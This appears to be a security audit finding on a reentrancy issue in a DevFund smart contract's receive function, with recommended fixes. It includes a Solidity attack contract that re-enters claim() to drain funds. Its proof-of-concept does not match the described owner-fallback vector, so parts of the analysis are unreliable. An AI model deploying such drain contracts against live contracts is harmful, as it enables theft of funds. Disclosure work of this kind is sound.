# Vulnerability details

## Impact
Description: The receive function sends Ether to the owner without any reentrancy protection. This can lead to a reentrancy attack where the fallback function of the owner contract reenters the receive function.

Impact: If the owner's fallback function reenters the contract, it can potentially drain the contract's funds.

Recommendation: Add the nonReentrant modifier to the receive function to prevent reentrancy attacks.


## Proof of Concept
Below is a simplified PoC demonstrating a reentrancy attack on the receive function.

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import './DevFund.sol';

contract ReentrancyAttack {
    DevFund public devFund;

    constructor(address _devFundAddress) {
        devFund = DevFund(payable(_devFundAddress));
    }

    receive() external payable {
        if (address(devFund).balance >= 1 ether) {
            devFund.claim();
        }
    }

    function attack() external payable {
        require(msg.value >= 1 ether, "Minimum 1 ether required");
        devFund.claim{value: msg.value}();
    }
}

## Recommended Mitigation Steps

Recommended Fixes
1. Reentrancy Guard and Event Emission:

receive() external payable nonReentrant {
    emit FundReceived(msg.sender, msg.value);

    if (totalDevWeight > 0) {
        uint256 amountPerWeight = msg.value / totalDevWeight;
        uint256 remaining = msg.value - (amountPerWeight * totalDevWeight);
        totalRewardDebt += amountPerWeight;
        if (remaining > 0) {
            (bool success, ) = payable(owner()).call{ value: remaining, gas: 2300 }('');
            require(success, 'Failed to send Ether to owner');
        }
    } else {
        (bool success, ) = payable(owner()).call{ value: msg.value, gas: 2300 }('');
        require(success, 'Failed to send Ether to owner');
    }
}



2. Specify Gas Limit in External Calls:


function safeRewardTransfer(
    address to,
    uint256 amount
) internal returns (uint256) {
    uint256 _rewardBalance = address(this).balance;
    if (amount > _rewardBalance) amount = _rewardBalance;
    (bool success, ) = payable(to).call{ value: amount, gas: 2300 }('');
    require(success, 'Failed to send Reward');
    return amount;
}
